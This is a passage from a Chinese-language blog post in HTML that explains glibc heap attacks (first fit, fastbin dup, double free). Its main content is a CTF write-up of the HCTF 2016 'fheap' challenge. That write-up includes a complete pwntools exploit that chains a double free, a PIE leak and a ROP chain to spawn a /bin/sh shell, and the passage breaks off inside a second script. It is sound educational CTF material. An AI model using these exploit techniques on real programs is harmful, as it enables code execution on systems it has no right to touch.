2016-bcloud</a></td>\n</tr>\n<tr>\n<td><a href=\"unsorted_bin_attack.c\">unsorted_bin_attack.c</a></td>\n<td>利用在unsortbin的freelist链表里的一个已释放chunk的overwrite去在任意地址中写入一个大数</td>\n<td><a href=\"https://github.com/ctfs/write-ups-2016/tree/master/0ctf-2016/exploit/zerostorage-6\" target=\"_blank\" rel=\"external\">0ctf 2016-zerostorage</a></td>\n</tr>\n<tr>\n<td><a href=\"house_of_einherjar.c\">house_of_einherjar.c</a></td>\n<td>Exploiting a single null byte overflow to trick malloc into returning a controlled pointer</td>\n<td><a href=\"https://gist.github.com/hhc0null/4424a2a19a60c7f44e543e32190aaabf\" target=\"_blank\" rel=\"external\">Seccon 2016-tinypad</a></td>\n</tr>\n</tbody>\n</table>\n</blockquote>\n<a id=\"more\"></a>\n<h2 id=\"0x01-first-fit\"><a href=\"#0x01-first-fit\" class=\"headerlink\" title=\"0x01 first fit\"></a>0x01 first fit</h2><p>这里主要提供了一个UAF的使用示例。glibc使用的first-fit算法来选择空间分配，当我们之前释放的chunk足够大时，程序就会最先使用这个chunk。但此时释放的上一个使用此chunk的指针依然指向这个chunk，我们可以通过一个已经free过的指针来控制这个chunk。</p>\n<h2 id=\"0x02-fastbin-dup\"><a href=\"#0x02-fastbin-dup\" class=\"headerlink\" title=\"0x02 fastbin dup\"></a>0x02 fastbin dup</h2><p>fastbin通过一个链表来维护空闲的chunk，当一个chunk被free掉之后，会将这个chunk接回链表的头部，下次申请时会申请这个chunk。</p>\n<h2 id=\"0x03-fastbin-dup-into-stack-double-free\"><a href=\"#0x03-fastbin-dup-into-stack-double-free\" class=\"headerlink\" title=\"0x03 fastbin dup into stack(double-free)\"></a>0x03 fastbin dup into stack(double-free)</h2><p>这个就是double-free的一个利用。<br>当我们<code>malloc</code>一个小于<code>128</code>的堆块的时候，<code>ptmalloc</code>就会调用到<code>fastbin</code>。<code>fastbin</code>是由一个单链表组成的，遵循<code>FIFO</code>原则，由于<code>fastbin</code>在<code>free</code>的时候并不会对指针是否已经释放做检查，所以我们可以构造出一个循环链表的情况。<br>比如：</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">int</span> *a = <span class=\"built_in\">malloc</span>(<span class=\"number\">8</span>) ;</div><div class=\"line\"><span class=\"keyword\">int</span> *b = <span class=\"built_in\">malloc</span>(<span class=\"number\">8</span>);</div><div class=\"line\"><span class=\"built_in\">free</span>(a);</div><div class=\"line\"><span class=\"built_in\">free</span>(b);</div></pre></td></tr></table></figure>\n<p>此时维护的一个链表结构为<br><code>[head] -&gt; b -&gt; a -&gt; null</code></p>\n<p>当我们再次</p>\n<p><code>free(a);</code></p>\n<p>此时的链表结构为</p>\n<p><code>[head] -&gt; a -&gt; b -&gt; a -&gt; null</code></p>\n<p>紧接着我们申请两次堆</p>\n<figure class=\"highlight gams\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">*a = malloc(8);</span></div><div class=\"line\"><span class=\"comment\">*b = malloc(8);</span></div></pre></td></tr></table></figure>\n<p>此时我们维护的链表结构为</p>\n<p><code>[head] -&gt; a -&gt; null</code></p>\n<p>如果我们修改<code>a</code>的前八个字节为我们的希望的地址，当我们两次<code>malloc</code>之后，我们就能得到一个指向任意地址的指针。</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">*a = &amp;attribute_addr;</div><div class=\"line\"><span class=\"keyword\">int</span> *c = <span class=\"built_in\">malloc</span>(<span class=\"number\">8</span>);   <span class=\"comment\">//c == a</span></div><div class=\"line\"><span class=\"keyword\">int</span> *d = <span class=\"built_in\">malloc</span>(<span class=\"number\">8</span>);   <span class=\"comment\">// d == attribute_addr</span></div></pre></td></tr></table></figure>\n<p>维护的链表如下</p>\n<figure class=\"highlight xl\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">[<span class=\"function\"><span class=\"title\">head</span>] -&gt;</span> <span class=\"function\"><span class=\"title\">a</span> -&gt;</span> null</div><div class=\"line\">[<span class=\"function\"><span class=\"title\">head</span>] -&gt;</span> <span class=\"function\"><span class=\"title\">a</span> -&gt;</span> attribute</div><div class=\"line\">[<span class=\"function\"><span class=\"title\">head</span>] -&gt;</span> attribute</div></pre></td></tr></table></figure>\n<p>于是我们就可以得到一个<code>8bit</code>的任意地址写了。</p>\n<p>以下用<em>2016hctf</em>的<code>就是干</code>为例</p>\n<h4 id=\"例题\"><a href=\"#例题\" class=\"headerlink\" title=\"例题\"></a>例题</h4><p>首先分析程序，先查看程序的保护</p>\n<figure class=\"highlight groovy\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div></pre></td><td class=\"code\"><pre><div class=\"line\">ubuntu<span class=\"meta\">@VM</span><span class=\"number\">-250</span><span class=\"number\">-199</span>-<span class=\"string\">ubuntu:</span><span class=\"regexp\">~/ctf-problem/</span><span class=\"number\">2016</span>hctf<span class=\"regexp\">/pwn/</span>fheap$ checksec pwn-f </div><div class=\"line\">[*] <span class=\"string\">'/home/ubuntu/ctf-problem/2016hctf/pwn/fheap/pwn-f'</span></div><div class=\"line\"><span class=\"symbol\">    Arch:</span>     amd64<span class=\"number\">-64</span>-little</div><div class=\"line\"><span class=\"symbol\">    RELRO:</span>    Partial RELRO</div><div class=\"line\"><span class=\"symbol\">    Stack:</span>    Canary found</div><div class=\"line\"><span class=\"symbol\">    NX:</span>       NX enabled</div><div class=\"line\"><span class=\"symbol\">    PIE:</span>      PIE enabled</div></pre></td></tr></table></figure>\n<p>由于程序打开的PIE，我们在gdb调试的时候很不方便，gdb默认是关闭<code>aslr</code>的，但是它会给程序加上一个默认的基地址<code>0x555555554000</code></p>\n<p>这个程序有两个功能：</p>\n<ol>\n<li>添加字符串</li>\n<li>删除一个字符串</li>\n</ol>\n<p>其中，存储字符串的结构题如下：</p>\n<figure class=\"highlight lsl\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"number\">00000000</span> info            struc ; (sizeof=<span class=\"number\">0x20</span>, mappedto_1)</div><div class=\"line\"><span class=\"number\">00000000</span> content         db <span class=\"number\">16</span> dup(?)            ; <span class=\"type\">string</span>(C)</div><div class=\"line\"><span class=\"number\">00000010</span> size            dq ?</div><div class=\"line\"><span class=\"number\">00000018</span> DestroyFunc      dq ?                    ; 这里是程序的调用的free函数的地址</div><div class=\"line\"><span class=\"number\">00000020</span> info            ends</div><div class=\"line\"></div><div class=\"line\">struct info&#123;</div><div class=\"line\">\tchar cintent[<span class=\"number\">16</span>];</div><div class=\"line\">    int size;</div><div class=\"line\">    void* DestroyFunc;</div><div class=\"line\">&#125;;</div></pre></td></tr></table></figure>\n<p>当我们申请小于15字节的长度时，字符串会直接保存在<code>info.content</code>中。当我们申请长度大于15的字符串的时候，程序会另外申请一个字符串大小的堆，同时这个堆的地址保存在原本的<code>info.content</code>中</p>\n<figure class=\"highlight awk\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">if</span> ( nbytesa &gt; <span class=\"number\">15</span> )</div><div class=\"line\">&#123;</div><div class=\"line\">  dest = (char *)malloc(nbytesa);</div><div class=\"line\">  <span class=\"keyword\">if</span> ( !dest )</div><div class=\"line\">  &#123;</div><div class=\"line\">    puts(<span class=\"string\">\"malloc faild!\"</span>);</div><div class=\"line\">    <span class=\"keyword\">exit</span>(<span class=\"number\">1</span>);</div><div class=\"line\">  &#125;</div><div class=\"line\">  strncpy(dest, &amp;buf, nbytesa);</div><div class=\"line\">  *(_QWORD *)ptr = dest;</div><div class=\"line\">  *((_QWORD *)ptr + <span class=\"number\">3</span>) = sub_D6C;           <span class=\"regexp\">//</span> free(*content)</div><div class=\"line\">                                            <span class=\"regexp\">//</span> free(content)</div><div class=\"line\">&#125;</div><div class=\"line\"><span class=\"keyword\">else</span></div><div class=\"line\">&#123;</div><div class=\"line\">  strncpy(ptr, &amp;buf, nbytesa);</div><div class=\"line\">  *((_QWORD *)ptr + <span class=\"number\">3</span>) = sub_D52;           <span class=\"regexp\">//</span> free(content)</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>\n<p>小于15时堆内存分布<br><figure class=\"highlight dns\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\">pwndbg&gt; x/<span class=\"number\">6</span>xg <span class=\"number\">0</span>x5<span class=\"number\">55555757000</span></div><div class=\"line\"><span class=\"number\">0</span>x5<span class=\"number\">55555757000</span>:\t<span class=\"number\">0</span>x00000<span class=\"number\">00000000000</span>\t<span class=\"number\">0</span>x00000<span class=\"number\">00000000031</span></div><div class=\"line\"><span class=\"number\">0</span>x5<span class=\"number\">55555757010</span>:\t<span class=\"number\">0</span>x000<span class=\"number\">0000061616161</span>\t<span class=\"number\">0</span>x00000<span class=\"number\">00000000000</span>           // content</div><div class=\"line\"><span class=\"number\">0</span>x5<span class=\"number\">55555757020</span>:\t<span class=\"number\">0</span>x00000<span class=\"number\">00000000004</span>\t<span class=\"number\">0</span>x00005<span class=\"number\">55555554d52</span>           // size + DestroyFunc</div></pre></td></tr></table></figure></p>\n<p>大于15时堆内存的分布情况<br><figure class=\"highlight dns\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div></pre></td><td class=\"code\"><pre><div class=\"line\">pwndbg&gt; x/<span class=\"number\">6</span>xg <span class=\"number\">0</span>x5<span class=\"number\">55555757060</span></div><div class=\"line\"><span class=\"number\">0</span>x5<span class=\"number\">55555757060</span>:\t<span class=\"number\">0</span>x00000<span class=\"number\">00000000000</span>\t<span class=\"number\">0</span>x00000<span class=\"number\">00000000021</span></div><div class=\"line\"><span class=\"number\">0</span>x5<span class=\"number\">55555757070</span>:\t<span class=\"number\">0</span>x6<span class=\"number\">161616161616161</span>\t<span class=\"number\">0</span>x6262<span class=\"number\">626262626161</span>           // content</div><div class=\"line\"><span class=\"number\">0</span>x5<span class=\"number\">55555757080</span>:\t<span class=\"number\">0</span>x0000000<span class=\"number\">00a626262</span>\t<span class=\"number\">0</span>x00000<span class=\"number\">00000020f81</span></div><div class=\"line\">pwndbg&gt; x/<span class=\"number\">6</span>xg <span class=\"number\">0</span>x5<span class=\"number\">55555757030</span></div><div class=\"line\"><span class=\"number\">0</span>x5<span class=\"number\">55555757030</span>:\t<span class=\"number\">0</span>x00000<span class=\"number\">00000000000</span>\t<span class=\"number\">0</span>x00000<span class=\"number\">00000000031</span></div><div class=\"line\"><span class=\"number\">0</span>x5<span class=\"number\">55555757040</span>:\t<span class=\"number\">0</span>x00005<span class=\"number\">55555757070</span>\t<span class=\"number\">0</span>x00000<span class=\"number\">00000000000</span>          // new malloc addr</div><div class=\"line\"><span class=\"number\">0</span>x5<span class=\"number\">55555757050</span>:\t<span class=\"number\">0</span>x00000<span class=\"number\">00000000014</span>\t<span class=\"number\">0</span>x0000555555554d6c          // size +  DestroyFunc</div></pre></td></tr></table></figure></p>\n<p>再来看一下全局变量的堆管理情况</p>\n<figure class=\"highlight dns\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div></pre></td><td class=\"code\"><pre><div class=\"line\">pwndbg&gt; telescope <span class=\"number\">0</span>x5<span class=\"number\">55555554000</span>+<span class=\"number\">0x2020C0</span></div><div class=\"line\"><span class=\"number\">00</span>:<span class=\"number\">0000</span>│   <span class=\"number\">0</span>x55<span class=\"number\">55557560c0</span> (__bss_start+<span class=\"number\">32</span>) ◂— <span class=\"number\">0</span>x1</div><div class=\"line\"><span class=\"number\">01</span>:<span class=\"number\">0008</span>│   <span class=\"number\">0</span>x55<span class=\"number\">55557560c8</span> (__bss_start+<span class=\"number\">40</span>) —▸ <span class=\"number\">0</span>x5<span class=\"number\">55555757010</span> ◂— <span class=\"number\">0x61616161</span> /* 'aaaa' */</div><div class=\"line\"><span class=\"number\">02</span>:<span class=\"number\">0010</span>│   <span class=\"number\">0</span>x55<span class=\"number\">55557560d0</span> (__bss_start+<span class=\"number\">48</span>) ◂— <span class=\"number\">0</span>x1</div><div class=\"line\"><span class=\"number\">03</span>:<span class=\"number\">0018</span>│   <span class=\"number\">0</span>x55<span class=\"number\">55557560d8</span> (__bss_start+<span class=\"number\">56</span>) —▸ <span class=\"number\">0</span>x5<span class=\"number\">55555757040</span> —▸ <span class=\"number\">0</span>x5<span class=\"number\">55555757070</span> ◂— 'aaaaaaaaaabbbbb...'</div><div class=\"line\"><span class=\"number\">04</span>:<span class=\"number\">0020</span>│   <span class=\"number\">0</span>x55<span class=\"number\">55557560e0</span> (__bss_start+<span class=\"number\">64</span>) ◂— <span class=\"number\">0</span>x1</div><div class=\"line\"><span class=\"number\">05</span>:<span class=\"number\">0028</span>│   <span class=\"number\">0</span>x55<span class=\"number\">55557560e8</span> (__bss_start+<span class=\"number\">72</span>) —▸ <span class=\"number\">0</span>x5<span class=\"number\">55555757090</span> —▸ <span class=\"number\">0</span>x55<span class=\"number\">55557570c0</span> ◂— 'ccc\\naaaaaabbbbb...'</div><div class=\"line\"><span class=\"number\">06</span>:<span class=\"number\">0030</span>│   <span class=\"number\">0</span>x55<span class=\"number\">55557560f0</span> (__bss_start+<span class=\"number\">80</span>) ◂— <span class=\"number\">0</span>x0</div><div class=\"line\">... ↓</div><div class=\"line\">pwndbg&gt; x/<span class=\"number\">6</span>xg <span class=\"number\">0</span>x5<span class=\"number\">55555554000</span>+<span class=\"number\">0x2020C0</span></div><div class=\"line\"><span class=\"number\">0</span>x55<span class=\"number\">55557560c0</span>:\t<span class=\"number\">0</span>x00000<span class=\"number\">00000000001</span>\t<span class=\"number\">0</span>x00005<span class=\"number\">55555757010</span></div><div class=\"line\"><span class=\"number\">0</span>x55<span class=\"number\">55557560d0</span>:\t<span class=\"number\">0</span>x00000<span class=\"number\">00000000001</span>\t<span class=\"number\">0</span>x00005<span class=\"number\">55555757040</span></div><div class=\"line\"><span class=\"number\">0</span>x55<span class=\"number\">55557560e0</span>:\t<span class=\"number\">0</span>x00000<span class=\"number\">00000000001</span>\t<span class=\"number\">0</span>x00005<span class=\"number\">55555757090</span></div></pre></td></tr></table></figure>\n<p>堆管理结构中，前一个为表示是否占用，后一个表示字符串的地址。</p>\n<p>看一下删除操作的函数实现：<br><figure class=\"highlight lisp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div></pre></td><td class=\"code\"><pre><div class=\"line\">if ( <span class=\"name\">*</span>((<span class=\"name\">_QWORD</span> *)&amp;manage + 2 * v1 + <span class=\"number\">1</span>) )</div><div class=\"line\">  &#123;</div><div class=\"line\">    printf(<span class=\"string\">\"Are you sure?:\"</span>)<span class=\"comment\">;</span></div><div class=\"line\">    read(<span class=\"number\">0</span>, <span class=\"symbol\">&amp;buf</span>, <span class=\"number\">0</span>x100uLL)<span class=\"comment\">;</span></div><div class=\"line\">    if ( !strncmp(<span class=\"name\">&amp;buf</span>, <span class=\"string\">\"yes\"</span>, <span class=\"number\">3</span>uLL) )</div><div class=\"line\">    &#123;</div><div class=\"line\">      (<span class=\"name\">*</span>(<span class=\"name\">void</span> (<span class=\"name\">__fastcall</span> **)(<span class=\"name\">_QWORD</span>, const char *))(*((<span class=\"name\">_QWORD</span> *)&amp;manage + 2 * v1 + <span class=\"number\">1</span>) + <span class=\"number\">24</span>LL))(</div><div class=\"line\">        <span class=\"name\">*</span>((<span class=\"name\">_QWORD</span> *)&amp;manage + 2 * v1 + <span class=\"number\">1</span>),</div><div class=\"line\">        <span class=\"string\">\"yes\"</span>)<span class=\"comment\">;</span></div><div class=\"line\">      *((_DWORD *)<span class=\"symbol\">&amp;manage</span> + <span class=\"number\">4</span> * v1) = 0;</div><div class=\"line\">    &#125;</div><div class=\"line\">  &#125;</div></pre></td></tr></table></figure></p>\n<p>官方的源码如下：<br><figure class=\"highlight objectivec\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">void</span> deleteStr() &#123;</div><div class=\"line\">    <span class=\"keyword\">int</span> <span class=\"keyword\">id</span>;</div><div class=\"line\">\t<span class=\"keyword\">char</span> buf[<span class=\"number\">0x100</span>];</div><div class=\"line\">    printf(<span class=\"string\">\"Pls give me the string id you want to delete\\nid:\"</span>);</div><div class=\"line\">    <span class=\"keyword\">id</span> = getInt();</div><div class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"keyword\">id</span> &lt; <span class=\"number\">0</span> || <span class=\"keyword\">id</span> &gt; <span class=\"number\">0x10</span>) &#123;</div><div class=\"line\">        printf(<span class=\"string\">\"Invalid id\\n\"</span>);</div><div class=\"line\">    &#125;</div><div class=\"line\">    <span class=\"keyword\">if</span> (Strings[<span class=\"keyword\">id</span>].str) &#123;</div><div class=\"line\">\t\tprintf(<span class=\"string\">\"Are you sure?:\"</span>);</div><div class=\"line\">\t\tread(STDIN_FILENO,buf,<span class=\"number\">0x100</span>);</div><div class=\"line\">\t\t<span class=\"keyword\">if</span>(strncmp(buf,<span class=\"string\">\"yes\"</span>,<span class=\"number\">3</span>)) &#123;</div><div class=\"line\">\t\t\t<span class=\"keyword\">return</span>;</div><div class=\"line\">\t\t&#125;</div><div class=\"line\">        Strings[<span class=\"keyword\">id</span>].str-&gt;free(Strings[<span class=\"keyword\">id</span>].str);</div><div class=\"line\">        Strings[<span class=\"keyword\">id</span>].inuse = <span class=\"number\">0</span>;</div><div class=\"line\">    &#125;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure></p>\n<p>这里存在一个漏洞，程序检查的是字符串的结构体指针是否为0，但事实上是不可能为0的。同时利用<code>fastbin</code>不会检查是否已释放的特点，我们可以构造<code>double-free</code>那么我们就可以利用这一点，如果在结构体调用的<code>DestroyFunc</code>覆盖为其他函数，我们就可以造成任意函数执行。如果我们将堆上的函数覆盖位<code>puts</code>时，程序将会执行<code>puts(contents)</code>而不是<code>free(content)</code>，通过适当<code>content</code>，我们可以泄露程序基址。<br>在结构体的<code>DestroyFunc</code>部分，即使开了<code>PIE</code>，程序的最后三位也是不变的，我们只需要覆盖最后3位或2位即可。</p>\n<p>所以总结，此题的漏洞点在<code>UAF</code>&amp;<code>double-free</code>。<br>ecp:</p>\n<figure class=\"highlight livecodeserver\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div><div class=\"line\">61</div><div class=\"line\">62</div><div class=\"line\">63</div><div class=\"line\">64</div><div class=\"line\">65</div><div class=\"line\">66</div><div class=\"line\">67</div><div class=\"line\">68</div><div class=\"line\">69</div><div class=\"line\">70</div><div class=\"line\">71</div><div class=\"line\">72</div><div class=\"line\">73</div><div class=\"line\">74</div><div class=\"line\">75</div><div class=\"line\">76</div><div class=\"line\">77</div><div class=\"line\">78</div><div class=\"line\">79</div><div class=\"line\">80</div><div class=\"line\">81</div><div class=\"line\">82</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">#! /usr/bin/python</span></div><div class=\"line\"><span class=\"built_in\">from</span> pwn import *</div><div class=\"line\"></div><div class=\"line\">context.log_level = <span class=\"string\">'debug'</span></div><div class=\"line\">target = <span class=\"built_in\">process</span>(<span class=\"string\">'pwn-f'</span>)</div><div class=\"line\"></div><div class=\"line\">def <span class=\"built_in\">create</span>(size, <span class=\"keyword\">string</span>):</div><div class=\"line\">    target.recvuntil(<span class=\"string\">'quit'</span>)</div><div class=\"line\">    target.sendline(<span class=\"string\">'create '</span>)</div><div class=\"line\">    target.recvuntil(<span class=\"string\">'size:'</span>)</div><div class=\"line\">    target.sendline(str(size))</div><div class=\"line\">    target.recvuntil(<span class=\"string\">'str:'</span>)</div><div class=\"line\">    target.<span class=\"built_in\">send</span>(<span class=\"keyword\">string</span>)</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">def <span class=\"built_in\">delete</span>(id):</div><div class=\"line\">    target.recvuntil(<span class=\"string\">'quit'</span>)</div><div class=\"line\">    target.sendline(<span class=\"string\">'delete '</span>)</div><div class=\"line\">    target.recvuntil(<span class=\"string\">'id:'</span>)</div><div class=\"line\">    target.sendline(str(id))</div><div class=\"line\">    target.recvuntil(<span class=\"string\">'sure?:'</span>)</div><div class=\"line\">    target.sendline(<span class=\"string\">'yes'</span>)</div><div class=\"line\"></div><div class=\"line\"><span class=\"built_in\">create</span>(<span class=\"number\">4</span>, <span class=\"string\">'aaa\\n'</span>)</div><div class=\"line\"><span class=\"built_in\">create</span>(<span class=\"number\">4</span>, <span class=\"string\">'aaa\\n'</span>)</div><div class=\"line\"><span class=\"built_in\">delete</span>(<span class=\"number\">0</span>)</div><div class=\"line\"><span class=\"built_in\">delete</span>(<span class=\"number\">1</span>)</div><div class=\"line\"><span class=\"built_in\">delete</span>(<span class=\"number\">0</span>)</div><div class=\"line\"><span class=\"built_in\">create</span>(<span class=\"number\">4</span>, <span class=\"string\">'\\x00'</span>)</div><div class=\"line\"><span class=\"built_in\">create</span>(<span class=\"number\">0x20</span>, <span class=\"string\">'a'</span> * <span class=\"number\">0x16</span> + <span class=\"string\">'lo'</span> + <span class=\"string\">'\\x2d\\x00'</span>)</div><div class=\"line\"><span class=\"built_in\">delete</span>(<span class=\"number\">0</span>)</div><div class=\"line\"></div><div class=\"line\">target.recvuntil(<span class=\"string\">'lo'</span>)</div><div class=\"line\">addr = target.recvline()</div><div class=\"line\">addr = addr[:<span class=\"number\">-1</span>]</div><div class=\"line\">addr = u64(addr + <span class=\"string\">'\\x00'</span> * (<span class=\"number\">8</span> - <span class=\"built_in\">len</span>(addr))) - <span class=\"number\">0xd2d</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"built_in\">delete</span>(<span class=\"number\">1</span>)</div><div class=\"line\"></div><div class=\"line\"><span class=\"built_in\">create</span>(<span class=\"number\">4</span>, <span class=\"string\">'\\x00'</span>)</div><div class=\"line\"></div><div class=\"line\">target.recvuntil(<span class=\"string\">'quit'</span>)</div><div class=\"line\">target.sendline(<span class=\"string\">'create '</span>)</div><div class=\"line\">target.recvuntil(<span class=\"string\">'size:'</span>)</div><div class=\"line\">target.sendline(str(<span class=\"number\">0x20</span>))</div><div class=\"line\">target.recvuntil(<span class=\"string\">'str:'</span>)</div><div class=\"line\">target.<span class=\"built_in\">send</span>(<span class=\"string\">'a'</span> * <span class=\"number\">0x18</span> + p64(<span class=\"number\">0x00000000000011DC</span> + addr))</div><div class=\"line\"></div><div class=\"line\">print hex(addr)</div><div class=\"line\"></div><div class=\"line\">target.recvuntil(<span class=\"string\">'quit'</span>)</div><div class=\"line\">target.sendline(<span class=\"string\">'delete '</span>)</div><div class=\"line\">target.recvuntil(<span class=\"string\">'id:'</span>)</div><div class=\"line\">target.sendline(<span class=\"string\">'1'</span>)</div><div class=\"line\">target.recvuntil(<span class=\"string\">'sure?:'</span>)</div><div class=\"line\"></div><div class=\"line\">ropchain = p64(addr + <span class=\"number\">0x00000000000011e3</span>)   <span class=\"comment\"># pop rdi</span></div><div class=\"line\">ropchain += p64(addr + <span class=\"number\">0x202070</span>)            <span class=\"comment\"># got@malloc</span></div><div class=\"line\">ropchain += p64(addr + <span class=\"number\">0x0000000000000990</span>)  <span class=\"comment\"># plt@put</span></div><div class=\"line\"></div><div class=\"line\">ropchain += p64(addr + <span class=\"number\">0x00000000000011e3</span>)  <span class=\"comment\"># pop rdi</span></div><div class=\"line\">ropchain += p64(<span class=\"number\">1</span>)</div><div class=\"line\">ropchain += p64(addr + <span class=\"number\">0x00000000000011DA</span>)  <span class=\"comment\"># magic</span></div><div class=\"line\">ropchain += p64(<span class=\"number\">0</span>)                          <span class=\"comment\"># rbx</span></div><div class=\"line\">ropchain += p64(<span class=\"number\">1</span>)                          <span class=\"comment\"># rbp</span></div><div class=\"line\">ropchain += p64(addr + <span class=\"number\">0x0000000000202058</span>)  <span class=\"comment\"># r12 -&gt; rip got@read</span></div><div class=\"line\">ropchain += p64(<span class=\"number\">8</span>)                          <span class=\"comment\"># r13 -&gt; rdx</span></div><div class=\"line\">ropchain += p64(addr + <span class=\"number\">0x0000000000202078</span>)  <span class=\"comment\"># r14 -&gt; rsi got@atoi</span></div><div class=\"line\">ropchain += p64(<span class=\"number\">0</span>)                          <span class=\"comment\"># r15 -&gt; rdi</span></div><div class=\"line\">ropchain += p64(addr + <span class=\"number\">0x00000000000011C0</span>)  <span class=\"comment\"># magic</span></div><div class=\"line\">ropchain += <span class=\"string\">'a'</span>*<span class=\"number\">8</span>*<span class=\"number\">7</span></div><div class=\"line\"></div><div class=\"line\">ropchain += p64(addr + <span class=\"number\">0x0000000000000B65</span>)  <span class=\"comment\"># getInt</span></div><div class=\"line\"></div><div class=\"line\">target.sendline(<span class=\"string\">'yes     '</span> + ropchain)</div><div class=\"line\">addr = target.recvline()[:<span class=\"number\">-1</span>]</div><div class=\"line\">addr = u64(addr + <span class=\"string\">'\\x00'</span> * (<span class=\"number\">8</span> - <span class=\"built_in\">len</span>(addr)))</div><div class=\"line\"><span class=\"comment\">#addr = addr - 534112 + 288144</span></div><div class=\"line\">addr = addr - <span class=\"number\">537984</span> + <span class=\"number\">283536</span></div><div class=\"line\">print hex(addr)</div><div class=\"line\">target.sendline(p64(addr)+<span class=\"string\">'/bin/sh'</span>)</div><div class=\"line\">target.interactive()</div></pre></td></tr></table></figure>\n<p>另外一种方法，更简单，<a href=\"https://cartermgj.github.io/2016/12/01/Hctf-jiushigan/\" target=\"_blank\" rel=\"external\">参考链接</a></p>\n<figure class=\"highlight lua\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div 